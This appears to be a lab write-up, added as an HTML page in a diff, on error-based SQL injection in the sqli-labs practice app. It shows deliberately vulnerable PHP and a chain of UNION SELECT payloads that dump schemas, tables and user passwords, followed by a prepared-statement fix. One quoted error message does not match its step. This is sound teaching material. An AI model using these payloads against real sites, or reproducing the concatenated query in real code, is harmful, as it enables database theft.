@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection Lab – Lesson 1 (Error-Based: String)</title>
+
+  <!-- Terminal-theme CSS -->
+  <style>
+    :root {
+      --bg: #0d0f17;
+      --surface: #13151c;
+      --text: #a0a8b8;
+      --accent: #7aa2f7;
+      --border: #24283b;
+      --cyan: #7dcfff;
+      --green: #9ece6a;
+      --yellow: #e0af68;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "Cascadia Code", "Fira Mono", Consolas, monospace;
+      background: var(--bg);
+      color: var(--text);
+      font-size: 14px;
+      line-height: 1.55;
+      min-height: 100vh;
+    }
+
+    .bar {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 4px 12px;
+      display: flex;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .bar span { color: var(--accent); }
+
+    .wrap {
+      max-width: 960px;
+      margin: auto;
+      padding: 2rem 1rem;
+    }
+
+    .prompt { color: var(--green); }
+    .cmd    { color: var(--yellow); }
+
+    img {
+      max-width: 100%;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      margin: 1rem 0;
+    }
+
+    h1, h2, h3 {
+      color: var(--accent);
+      margin-top: 1.5rem;
+      margin-bottom: .5rem;
+    }
+    h1 { font-size: 1.4rem; }
+    h2 { font-size: 1.2rem; }
+    h3 { font-size: 1.05rem; }
+
+    code {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 2px 4px;
+      border-radius: 3px;
+      color: var(--yellow);
+      font-size: 13px;
+    }
+
+    pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: .75rem 1rem;
+      overflow-x: auto;
+      margin: .5rem 0;
+    }
+
+    ul {
+      margin-left: 1.2rem;
+      margin-top: .5rem;
+    }
+    li { margin-bottom: .25rem; }
+
+    .tags {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      padding: .5rem .75rem;
+      display: flex;
+      flex-wrap: wrap;
+      gap: .5rem;
+      margin: 1rem 0;
+    }
+    .tag {
+      background: var(--accent);
+      color: var(--bg);
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    footer {
+      text-align: center;
+      padding: 2rem 0;
+      color: var(--cyan);
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="bar">
+    <span>user@lab</span>
+    <span>~/sqli-lesson-01</span>
+  </div>
+
+  <main class="wrap">
+    <h1>SQL Injection Lab – Lesson 1 (Error-Based: String)</h1>
+
+    <div class="tags">
+      <span class="tag">SQL Injection</span>
+      <span class="tag">Web Security</span>
+      <span class="tag">Error-Based Injection</span>
+      <span class="tag">Labs</span>
+    </div>
+
+    <h2>What is this Lesson About?</h2>
+    <p>This lab demonstrates a classic <strong class="cmd">Error-Based SQL Injection vulnerability</strong>.</p>
+    <p>The application takes user input from the URL (<code>id</code> parameter) and uses it directly in a SQL query without proper validation or sanitization.</p>
+    <p>The purpose of this lesson is to understand how SQL errors can reveal valuable information and how attackers exploit them.</p>
+
+    <h2>How to Identify if It Is Error-Based?</h2>
+    <p>When testing a parameter for SQL injection, attackers often add characters like:</p>
+    <pre><code>?id=1
+?id=1'
+?id=1"
+?id=1)
+?id=1')
+?id=1")</code></pre>
+    <p>If the application displays a <strong>database error message</strong>:</p>
+    <pre><code>Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code></pre>
+    <p>This indicates an <strong class="cmd">Error-Based SQL Injection</strong>.</p>
+    <p>In this lab, when an invalid character such as <code>'</code> (single quote) is added, the application responds with an SQL error.</p>
+    <p>This confirms that the application is vulnerable to <strong class="cmd">Error-Based SQL Injection (String)</strong>.</p>
+
+    <h2>Vulnerable Source Code</h2>
+    <pre><code>&lt;?php
+// https://github.com/Audi-1/sqli-labs/blob/master/Less-1/index.php 
+// including the MySQLi connection file
+include("../sql-connections/sql-connect.php");
+
+// check for ID parameter
+if (isset($_GET['id'])) {
+    $id = $_GET['id'];
+
+    // SQL query
+    $sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+    $result = mysqli_query($con, $sql);
+
+    if ($result) {
+        $row = mysqli_fetch_array($result);
+        if ($row) {
+            echo "Your Login name: " . htmlspecialchars($row['username']) . "&lt;br&gt;";
+            echo "Your Password: " . htmlspecialchars($row['password']);
+        } else {
+            echo "No user found with that ID.";
+        }
+    } else {
+        echo "Query Error: " . mysqli_error($con);
+    }
+} else {
+    echo "Please input the ID as parameter with numeric value";
+}
+?&gt;</code></pre>
+    <p><strong>Issue:</strong></p>
+    <ul>
+      <li>The variable <code>$id</code> is directly placed into the query.</li>
+      <li>No validation, escaping, or parameterization is done.</li>
+    </ul>
+
+    <h2>How the Injection Happens</h2>
+    <p>The injection happens because the application directly takes the <code>id</code> parameter from the URL.</p>
+    <pre><code>http://localhost/sqli-labs/Less-1/?id=1</code></pre>
+    <p>The input is inserted into the query without sanitization:</p>
+    <pre><code>SELECT * FROM users WHERE id='1' LIMIT 0,1</code></pre>
+    <p>If an attacker inputs <code>' OR '1'='1</code> the query becomes:</p>
+    <pre><code>SELECT * FROM users WHERE id='' OR '1'='1' LIMIT 0,1</code></pre>
+    <p>Since <code>'1'='1'</code> is always true, the attacker can bypass conditions and retrieve unintended results.</p>
+
+    <h2>Payloads for Exploitation</h2>
+    <p>Once the injection point is confirmed, attackers can use payloads to extract sensitive data from the database.</p>
+
+    <h3>Checking Injection</h3>
+    <pre><code>?id=1' OR '1'='1 --+
+?id=1' AND '1'='2 --+</code></pre>
+
+    <h3>Dumping data from DB</h3>
+    <h3>Finding Column Count (using ORDER BY)</h3>
+    <pre><code>?id=1' ORDER BY 1 --+
+?id=1' ORDER BY 2 --+
+?id=1' ORDER BY 3 --+</code></pre>
+    <p>If we run:</p>
+    <pre><code>?id=1' ORDER BY 4 --+</code></pre>
+    <p>We will receive this error which means we only have 3 columns:</p>
+    <pre><code>Fatal error: Uncaught mysqli_sql_exception: Unknown column '19' in 'order clause'</code></pre>
+    <p>Now we've 3 columns, so our payloads will look like this:</p>
+    <pre><code>?id=-1' UNION SELECT 1,2,3 --+</code></pre>
+    <p>As you can see here our column is being reflected:</p>
+    <img src="../../../../assets/images/sqli-01/columnreflect.jpg" alt="Column Reflect">
+    <p><strong>Getting Database Name:</strong></p>
+    <pre><code>?id=-1' UNION SELECT 1,database(),3 --+</code></pre>
+    <img src="../../../../assets/images/sqli-01/databasereflect.jpg" alt="Database Reflect">
+    <p><strong>Getting Current User:</strong></p>
+    <pre><code>?id=-1' UNION SELECT 1, user(),3 --+</code></pre>
+    <img src="../../../../assets/images/sqli-01/cuser.jpg" alt="Current User">
+    <p><strong>Listing Databases:</strong></p>
+    <pre><code>?id=-1' UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata --+</code></pre>
+    <img src="../../../../assets/images/sqli-01/listofdb.jpg" alt="List of Databases">
+    <p><strong>Dumping Tables of Current Database:</strong></p>
+    <pre><code>?id=-1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() --+</code></pre>
+    <img src="../../../../assets/images/sqli-01/tofcdb.jpg" alt="Tables of Current Database">
+    <p><strong>Dumping Columns of a Table:</strong></p>
+    <pre><code>?id=-1' UNION SELECT 1,2,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' --+</code></pre>
+    <img src="../../../../assets/images/sqli-01/dcofct.jpg" alt="Dumping Columns of Table">
+    <p><strong>Extracting Data from Users Table:</strong></p>
+    <pre><code>?id=-1' UNION SELECT 1,GROUP_CONCAT(username),GROUP_CONCAT(password)FROM users --+</code></pre>
+    <img src="../../../../assets/images/sqli-01/edfut.jpg" alt="Extracting Data from Users Table">
+
+    <h2>How to Fix SQL Injection</h2>
+    <p>To prevent SQL Injection, follow secure coding practices:</p>
+
+    <h3>Use Prepared Statements (Parameterized Queries):</h3>
+    <pre><code>&lt;?php
+include("../sql-connections/sql-connect.php");
+
+if (isset($_GET['id'])) {
+    $id = $_GET['id'];
+
+    // Use prepared statements
+    $stmt = $con->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
+    $stmt->bind_param("i", $id); // "i" means integer
+    $stmt->execute();
+
+    $result = $stmt->get_result();
+    if ($row = $result->fetch_assoc()) {
+        echo "Your Login name: " . htmlspecialchars($row['username']) . "&lt;br&gt;";
+        echo "Your Password: " . htmlspecialchars($row['password']);
+    } else {
+        echo "No user found with that ID.";
+    }
+}
+?&gt;</code></pre>
+
+    <h3>Other Best Practices:</h3>
+    <ul>
+      <li>Validate input (ensure id is numeric).</li>
+      <li>Hide detailed database error messages from users.</li>
+      <li>Use least privilege principle for database accounts.</li>
+    </ul>
+
+    <h2>Final Summary</h2>
+    <p>This lesson demonstrates an Error-Based String SQL Injection.</p>
+    <ul>
+      <li>Attackers identify it by injecting special characters and observing database error messages.</li>
+      <li>The vulnerability occurs due to unsanitized input directly used in SQL queries.</li>
+      <li>Payloads can extract database name, user, tables, columns, and data.</li>
+      <li>The solution is to use prepared statements, input validation, and avoid displaying detailed error messages.</li>
+    </ul>
+    <p class="cmd">✅ Stay secure!</p>
+  </main>
+
+  <footer>
+    <span>EOF ── happy hacking :)</span>
+  </footer>
+</body>
+</html>
